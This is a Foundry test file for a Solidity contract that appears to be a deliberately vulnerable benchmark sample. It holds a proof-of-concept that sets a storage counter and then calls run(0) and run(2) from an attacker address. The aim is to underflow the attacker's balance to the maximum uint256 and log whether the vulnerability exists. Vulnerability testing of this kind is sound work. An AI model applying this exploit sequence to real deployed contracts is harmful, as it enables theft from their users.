// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_onefunc_feasible.sol";

contract IntegerOverflowHelper {
    IntegerOverflowMultiTxOneFuncFeasible public target;
    constructor(address _target) {
        target = IntegerOverflowMultiTxOneFuncFeasible(_target);
    }

    function getCount() public view returns (uint256) {
        bytes32 slot;
        assembly {
            slot := sload(1)
        }
        return uint256(slot);
    }

    function setCount(uint256 _count) public {
        bytes32 newSlot = bytes32(_count);
        assembly {
            sstore(1, newSlot)
        }
    }
}

contract IntegerOverflowMultiTxOneFuncFeasibleTest is Test {
    IntegerOverflowMultiTxOneFuncFeasible public targetContract;
    IntegerOverflowHelper public helper;
    address public attacker = address(0x1234);

    function setUp() public {
        targetContract = new IntegerOverflowMultiTxOneFuncFeasible();
        helper = new IntegerOverflowHelper(address(targetContract));
    }

    function testIntegerUnderflow() public {
        // Set initial count to 1
        helper.setCount(1);

        // Check state BEFORE attack
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 preAttackCount = helper.getCount();
        uint256 preAttackBalance = targetContract.getUserBalance(attacker);
        console.log("Initial count:", preAttackCount);
        console.log("Initial attacker balance:", preAttackBalance);

        // Simulate attack sequence
        console.log("--- Trigger Step1: Initialize with run(0) ---");
        vm.prank(attacker);
        targetContract.run(0);

        console.log("--- Trigger Step2: Underflow with run(2) ---");
        vm.prank(attacker);
        targetContract.run(2);

        // Check state AFTER attack
        console.log("--- AFTER-Trigger Attack ---");
        uint256 postAttackCount = helper.getCount();
        uint256 postAttackBalance = targetContract.getUserBalance(attacker);
        console.log("Final count:", postAttackCount);
        console.log("Final attacker balance:", postAttackBalance);

        // Determine vulnerability existence
        if (postAttackBalance == type(uint256).max) {
            console.log("Vulnerability Exists: Integer underflow successfully manipulated attacker balance");
        } else {
            console.log("Vulnerability not Exist: No integer underflow detected in balance change");
        }
    }
}